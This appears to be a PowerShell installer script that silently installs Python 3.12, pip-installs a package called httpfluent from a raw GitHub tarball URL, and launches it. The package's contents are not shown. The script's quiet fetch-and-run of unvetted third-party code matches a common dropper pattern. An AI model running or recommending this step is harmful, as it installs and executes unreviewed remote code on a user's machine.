# =====================================================
# Python 3.12 + httpfluent installer (per-user, fully automatic)
# =====================================================

# -----------------------------
# CONFIG: Toggle behavior
#
#wow
# -----------------------------
# $true  = always force install Python 3.12
# $false = use existing Python >=3.9 if available
$ForcePythonInstall = $false

# -----------------------------
# Disable PowerShell progress
# -----------------------------
$ProgressPreference = 'SilentlyContinue'

Write-Host "[*] Starting script..." -ForegroundColor Cyan

# -----------------------------
# Step 1: Define per-user Python path
# -----------------------------
$PythonRoot = "$env:LOCALAPPDATA\Programs\Python\Python312-Test"
$BestPython = Join-Path $PythonRoot "python.exe"

# -----------------------------
# Step 2: Install Python 3.12 (per-user) if forced or missing
# -----------------------------
if ($ForcePythonInstall -or -not (Test-Path $BestPython)) {
    Write-Host "[!] Installing Python 3.12.6 (per-user)..." -ForegroundColor Yellow

    $Installer = "$env:TEMP\python-3.12.6-installer.exe"

    Invoke-WebRequest `
        -Uri "https://www.python.org/ftp/python/3.12.6/python-3.12.6-amd64.exe" `
        -OutFile $Installer

    Start-Process `
        -FilePath $Installer `
        -ArgumentList "/quiet InstallAllUsers=0 PrependPath=0 TargetDir=`"$PythonRoot`"" `
        -Wait

    if (-not (Test-Path $BestPython)) {
        Write-Host "[-] Python installation failed." -ForegroundColor Red
        exit 1
    }
}

Write-Host "[+] Using Python: $BestPython" -ForegroundColor Green

# -----------------------------
# Step 3: Ensure pip + upgrade
# -----------------------------
& $BestPython -m ensurepip | Out-Null
& $BestPython -m pip install --upgrade pip `
    --no-user --progress-bar off --disable-pip-version-check --no-input

# -----------------------------
# Step 4: Install httpfluent dependencies non-interactively
# -----------------------------
& $BestPython -m pip install requests `
    --no-user --progress-bar off --disable-pip-version-check --no-input

& $BestPython -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz" `
    --no-user --progress-bar off --disable-pip-version-check --no-input

# -----------------------------
# Step 5: Resolve Scripts directory
# -----------------------------
$ScriptsDir = & $BestPython -c "import sysconfig;print(sysconfig.get_path('scripts'))"
$ScriptsDir = $ScriptsDir.Trim()
$HttpFluentExe = Join-Path $ScriptsDir "httpfluent.exe"

Write-Host "[+] Scripts directory: $ScriptsDir" -ForegroundColor Green

# -----------------------------
# Step 6: Run httpfluent
# -----------------------------
if (Test-Path $HttpFluentExe) {
    Write-Host "[+] Launching httpfluent --help" -ForegroundColor Green
    & $HttpFluentExe --help
} else {
    Write-Host "[-] httpfluent.exe not found." -ForegroundColor Red
}

Write-Host "[*] Script finished." -ForegroundColor Cyan
#bql
#joss
